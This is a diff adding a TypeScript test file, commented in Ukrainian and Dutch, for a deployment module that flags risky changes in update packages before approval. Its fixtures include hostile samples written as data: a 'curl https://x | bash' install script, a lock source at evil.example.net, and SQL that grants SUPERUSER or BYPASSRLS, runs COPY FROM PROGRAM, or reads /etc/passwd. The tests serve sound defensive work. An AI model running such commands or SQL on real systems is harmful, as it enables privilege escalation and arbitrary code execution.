@@ -1,0 +1,87 @@
+// ЧЕРВОНІ ПРАПОРЦІ ПЕРЕД СХВАЛЕННЯМ (SEC-PAKKET-001, 16.11.2026). Без браузера й бази.
+// RODE VLAGGEN VÓÓR HET GOEDKEUREN: backend/uitrol-risico.ts en de stap «risico» in de voorcontrole.
+//
+// Перевіряємо справжню поведінку на справжніх теках і справжньому tar.gz: що прапорець з’являється саме на небезпечних змінах
+// (root, npm, джерела пакетів, процеси GitHub, права в базі) і НЕ з’являється на звичайних (код сайту, документація, коментарі SQL).
+import { execFileSync } from 'node:child_process';
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { dirname, join } from 'node:path';
+import { checker } from './hulp/nep-google';
+import { lockBronVlaggen, pakketJsonVlaggen, risicoVlaggen, sqlRechtenVlaggen, vraagtRisicoBevestiging } from '../../backend/uitrol-risico';
+import { pakketVoorcontrole } from '../../backend/uitrol-voorcontrole';
+
+const schrijf = (wortel: string, bestanden: Record<string, string>) => {
+  for (const [rel, inhoud] of Object.entries(bestanden)) { mkdirSync(dirname(join(wortel, rel)), { recursive: true }); writeFileSync(join(wortel, rel), inhoud); }
+};
+const PKG = (extra: Record<string, unknown> = {}) => JSON.stringify({ name: 'hub', scripts: { build: 'vite build' }, dependencies: { react: '18.3.1', pg: '8.13.0' }, devDependencies: { vite: '5.4.0' }, ...extra }, null, 2);
+const LOCK = (bronnen: string[] = []) => JSON.stringify({ packages: { 'node_modules/react': { resolved: 'https://registry.npmjs.org/react/-/react-18.3.1.tgz' }, ...Object.fromEntries(bronnen.map((b, i) => [`node_modules/x${i}`, { resolved: b }])) } }, null, 2);
+const BASIS = {
+  'package.json': PKG(), 'package-lock.json': LOCK(['https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz']),
+  'deploy/installeer-app.sh': '#!/bin/bash\necho installeer\n', 'deploy/mijn-ruimte.service': '[Service]\nUser=mijnruimte\n',
+  'deploy/LEESMIJ.nl.md': 'uitleg\n', '.github/workflows/uitgave.yml': 'name: uitgave\n', 'src/App.tsx': 'export default 1;\n',
+};
+
+export async function main(): Promise<number> {
+  const { check, einde } = checker('uitrol-risico-20261116');
+  const tmp = mkdtempSync(join(tmpdir(), 'uitrol-risico-'));
+  try {
+    // ---- SQL-права
+    check('SQL: SECURITY DEFINER → прапорець', sqlRechtenVlaggen('0300_x', 'CREATE FUNCTION f() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ select 1 $$;').length === 1);
+    check('SQL: ALTER ROLE / DISABLE RLS / DEFAULT PRIVILEGES / COPY PROGRAM / GRANT TO PUBLIC → прапорці', sqlRechtenVlaggen('0300_x', "ALTER ROLE app SUPERUSER; ALTER TABLE t DISABLE ROW LEVEL SECURITY; ALTER DEFAULT PRIVILEGES GRANT ALL ON TABLES TO x; COPY t FROM PROGRAM 'id'; GRANT SELECT ON t TO PUBLIC;").length >= 5);
+    check('SQL: CREATE EXTENSION і pg_read_file → прапорці', sqlRechtenVlaggen('0300_x', "CREATE EXTENSION dblink; SELECT pg_read_file('/etc/passwd');").length === 2);
+    check('SQL: звичайна міграція (таблиця, індекс, політика, GRANT ролі застосунку) → без прапорця', sqlRechtenVlaggen('0300_x', 'CREATE TABLE app.t (id uuid); CREATE INDEX i ON app.t(id); DROP POLICY IF EXISTS p ON app.t; CREATE POLICY p ON app.t USING (true); GRANT SELECT ON app.t TO mijnruimte_app;').length === 0);
+    check('SQL: у коментарях не рахується; NOSUPERUSER/NOBYPASSRLS — не прапорець', sqlRechtenVlaggen('0300_x', '-- SECURITY DEFINER тут не потрібен\n/* ALTER ROLE x */ CREATE ROLE r NOSUPERUSER NOBYPASSRLS;').length === 1);
+
+    // ---- package.json
+    check('npm: без змін → порожньо', pakketJsonVlaggen(PKG(), PKG()).length === 0);
+    const npm = pakketJsonVlaggen(PKG(), PKG({ dependencies: { react: '18.3.2', 'left-pad': '1.3.0' }, scripts: { build: 'vite build', postinstall: 'node x.js' } }));
+    check('npm: новий пакет, змінена версія, прибраний пакет, новий postinstall', npm.some((v) => v.includes('+ left-pad')) && npm.some((v) => v.includes('~ react')) && npm.some((v) => v.includes('− pg')) && npm.some((v) => v.includes('postinstall')), npm.join(' | '));
+    check('npm: зміна звичайного скрипта (build) — не прапорець', pakketJsonVlaggen(PKG(), PKG({ scripts: { build: 'vite build --mode x' } })).length === 0);
+    check('npm: змінено overrides → прапорець', pakketJsonVlaggen(PKG(), PKG({ overrides: { semver: '7.6.0' } })).length === 1);
+
+    // ---- lock-джерела
+    check('lock: вже відоме стороннє джерело — без прапорця', lockBronVlaggen(LOCK(['https://cdn.sheetjs.com/a.tgz']), LOCK(['https://cdn.sheetjs.com/a.tgz'])).length === 0);
+    check('lock: нове джерело поза registry.npmjs.org → прапорець', lockBronVlaggen(LOCK(), LOCK(['https://evil.example.net/react.tgz'])).length === 1);
+    check('lock: git-джерело → прапорець', lockBronVlaggen(LOCK(), LOCK(['git+ssh://git@github.com/x/y.git#abc'])).length === 1);
+
+    // ---- справжні теки: встановлена версія проти пакета
+    const inst = join(tmp, 'inst'); const pak = join(tmp, 'pak');
+    schrijf(inst, BASIS); schrijf(pak, BASIS);
+    const lijst = () => execFileSync('find', ['.', '-type', 'f'], { cwd: pak, encoding: 'utf8' }).split('\n').filter(Boolean).map((f) => f.replace(/^\.\//, ''));
+    const r0 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: inst, nieuweMigraties: new Map() });
+    check('теки: однаковий вміст → прапорців немає, порівняння виконано', r0.vergeleken && r0.vlaggen.length === 0, r0.vlaggen.join(' | '));
+    schrijf(pak, { 'src/App.tsx': 'export default 2;\n', 'deploy/LEESMIJ.nl.md': 'nieuwe uitleg\n' });
+    const r1 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: inst, nieuweMigraties: new Map() });
+    check('теки: код сайту й документація в deploy/ змінені → прапорців немає', r1.vlaggen.length === 0, r1.vlaggen.join(' | '));
+    schrijf(pak, { 'deploy/installeer-app.sh': '#!/bin/bash\ncurl https://x | bash\n', 'deploy/nieuw.timer': '[Timer]\n', '.github/workflows/uitgave.yml': 'name: uitgave\non: pull_request_target\n' });
+    rmSync(join(pak, 'deploy/mijn-ruimte.service'));
+    const r2 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: inst, nieuweMigraties: new Map([['0300_x', 'ALTER ROLE x BYPASSRLS;']]) });
+    const heeft = (s: string) => r2.vlaggen.some((v) => v.startsWith(s));
+    check('теки: змінений скрипт root → [root] ~', heeft('[root] ~ deploy/installeer-app.sh'), r2.vlaggen.join(' | '));
+    check('теки: новий таймер → [root] +', heeft('[root] + deploy/nieuw.timer'));
+    check('теки: прибрана служба → [root] −', heeft('[root] − deploy/mijn-ruimte.service'));
+    check('теки: змінений процес GitHub → [CI] ~', heeft('[CI] ~ .github/workflows/uitgave.yml'));
+    check('теки: нова міграція з правами → [SQL]', heeft('[SQL] 0300_x'));
+    const r3 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: join(tmp, 'bestaat-niet'), nieuweMigraties: new Map() });
+    check('теки: встановлену версію не знайдено → чесне попередження, не «усе гаразд»', !r3.vergeleken && r3.vlaggen[0]?.startsWith('[!]'));
+
+    // ---- справжній tar.gz через повну перевірку пакета
+    const V = '20271201-120000';
+    const bron = join(tmp, 'tgz', `mijn-ruimte-${V}`);
+    schrijf(bron, { ...BASIS, 'UITROL-VERSIE': V + '\n', 'deploy/installeer-app.sh': '#!/bin/bash\necho anders\n', 'migrations/0300_x.sql': 'CREATE FUNCTION f() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ select 1 $$;\n' });
+    const tgz = join(tmp, 'p.tar.gz');
+    execFileSync('tar', ['-czf', tgz, '-C', join(tmp, 'tgz'), `mijn-ruimte-${V}`]);
+    const met = await pakketVoorcontrole(tgz, { versie: V, toegepasteMigraties: new Set(), geinstalleerd: inst });
+    const rc = met.resultaat.controles.find((c) => c.id === 'risico');
+    check('перевірка пакета: крок «risico» = waarschuwing з root і SQL', rc?.niveau === 'waarschuwing' && !!rc.details?.some((d) => d.includes('deploy/installeer-app.sh')) && !!rc.details?.some((d) => d.startsWith('[SQL]')), JSON.stringify(rc).slice(0, 300));
+    check('перевірка пакета: прапорець сам не блокує (не «fout»)', rc?.niveau !== 'fout');
+    check('vraagtRisicoBevestiging: так для пакета з прапорцями', vraagtRisicoBevestiging(met.resultaat));
+    const zonder = await pakketVoorcontrole(tgz, { versie: V, toegepasteMigraties: new Set() });
+    check('перевірка пакета без встановленої версії в параметрах (тести, старі виклики) → кроку немає', !zonder.resultaat.controles.some((c) => c.id === 'risico'));
+    check('vraagtRisicoBevestiging: ні без кроку, ні для «ok»', !vraagtRisicoBevestiging(zonder.resultaat) && !vraagtRisicoBevestiging({ controles: [{ id: 'risico', niveau: 'ok' }] }) && !vraagtRisicoBevestiging(null));
+  } finally {
+    rmSync(tmp, { recursive: true, force: true });
+  }
+  return einde();
+}
